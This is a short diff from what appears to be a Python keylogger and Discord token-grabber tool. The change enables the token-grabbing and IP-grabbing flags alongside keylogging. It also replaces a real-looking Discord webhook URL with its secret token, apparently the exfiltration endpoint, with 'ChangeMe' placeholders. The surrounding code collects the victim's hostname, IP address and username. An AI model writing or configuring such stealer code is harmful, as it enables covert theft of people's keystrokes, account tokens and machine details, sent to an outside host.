@@ -15,12 +15,12 @@ IPAddr = socket.gethostbyname(hostname)
 
 pcname = os.getenv('username')
 
-token_grabber = False
-ip_grabber_f = False
+token_grabber = True
+ip_grabber_f = True
 key_logger = True
 today = date.today()
 
-ext = {"webhook-id": "https://discordapp.com/api/webhooks/753719972437688410/se5UQhHyccAtFBR6FsrSAazeR9a9cgUmVsR1Kg8TcZOt6llSdFIPpCwr9SYGVHZW3n6b", "webhook-name": "KeyLogger"}
+ext = {"webhook-id": "ChangeMe", "webhook-name": "ChangeMe"}
 
 os.system('title TITLE OF THE APP')
 
